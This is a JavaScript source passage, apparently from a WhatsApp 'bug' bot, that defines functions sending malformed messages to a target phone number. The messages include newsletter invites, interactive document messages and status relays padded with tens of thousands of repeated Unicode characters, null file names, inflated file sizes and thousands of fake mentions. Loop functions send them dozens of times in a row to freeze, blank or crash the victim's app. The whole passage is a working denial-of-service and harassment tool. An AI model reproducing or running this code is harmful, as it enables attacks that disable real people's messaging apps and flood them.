            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" + TrashIosx, 
            matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰ𝘅𝗿𝗹.𝛆𝛘󠁀𞥆𝛆 ✩",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      for (let i = 0; i < 100; i++) {
      await axata.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await axata.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await axata.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      }
   } catch (err) {
      console.error(err);
   }
   
    if (i < 99) {
      await new Promise(resolve => setTimeout(resolve, 5000));
    }  
};

// ------------------ ( END FUNTION IPONGS ) ------------------------ \\

// ------------------ ( COMBO UI ) ------------------------ \\

async function Axatastuck(target, Ptcp = true) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "Vortunix Infinity 🔥!⟆" + "ꦾ".repeat(40000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(40000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await axata.relaymesangge(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

async function AxataKillYou(target) {
const msg = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "Masuk Bg Free Admin Buat Lu" + "ោ៝".repeat(10000),
      caption: "GyzenLyoraa Community" + "ោ៝".repeat(10000),
      inviteExpiration: "999999999"
    }
  };

  await axata.relaymesangge(target, msg, {
    participant: { jid: target },
    messageId: null
  });
}

async function Axtblankui(target, mention) {
console.log(chalk.red(`Success sendding bug to target`));
   await axata.relaymesangge(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "\u0000",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
         },
         hasMediaAttachment: true,
        },
        body: {
         text: "./GyzenLyoraa?" + "\u0000" + "ꦽ".repeat(120000),
        },
        nativeFlowMessage: {
         messageParamsJson: "{}",
        },
        contextInfo: {
         mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
          length: 10000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "\u0000",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    {
     participant: {
      jid: target
     }
    }
   );
  }

async function Blankapp(target, Ptcp = true) {
console.log(chalk.red({target}));
      await axata.relaymesangge(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "./GyzenLyoraa\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [target, "6289526156543@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }

// ------------------ ( END COMBO UI ) ------------------------ \\

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( TEMPAT COMBO FUNC ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

async function AxtSlowres(target) {
    for (let i = 0; i < 40; i++) {
        await AxataMuda(axata, target);
        await Axatastuck(target, Ptcp = true);
        await Blankapp(target, Ptcp = true);
        await AstecBlankButon(axata, target);
    }
}

async function BlankAxataKill(target) {
    for (let i = 0; i < tolbug2; i++) {
       await Blankapp(target, Ptcp = true);
       await Axatastuck(target, Ptcp = true);
       await AxataKillYou(target);
       await Blankapp(target, Ptcp = true);
    }
}

async function PortoAndro(target) {
    for (let i = 0; i < 45; i++) {
        await protocolAxt(target, true);
        await protocolbug(target, true);
        await Axtprotocol(target, true);
    }
}

async function AxataAndro(target) {
    for (let i = 0; i < 35; i++) {
        await AxataNewUi(target, Ptcp = true);
        await chatFrezze(axata, target);
        await AxataMuda(axata, target);
    }
}

async function BlankAndro(target) {
    for (let i = 0; i < 40; i++) {
        await AxataMuda(axata, target);
        await AxataNewUi(target, Ptcp = true);
        await LocationAxata(axata, target);
    }
}

async function BlankChat(target) {
    for (let i = 0; i < 40; i++) {
        await AstecBlankButon(axata, target);
        await AxataXPou(target);
        await AdminAxata(target);
    }
}

async function DelayAndro(target) {
    for (let i = 0; i < 20; i++) {
        await Delayspam(axata, target);
        await InvisDelay(target);
        await Delaylokal(target)
    }
}

async function DelayAxta(target) {
    for (let i = 0; i < 20; i++) {
        await DelayAxata(target);
        await AxtDelay(target, axata = false);
        await AxtBulldoVis(axata, target);
        await Delayspam(axata, target);
    }
}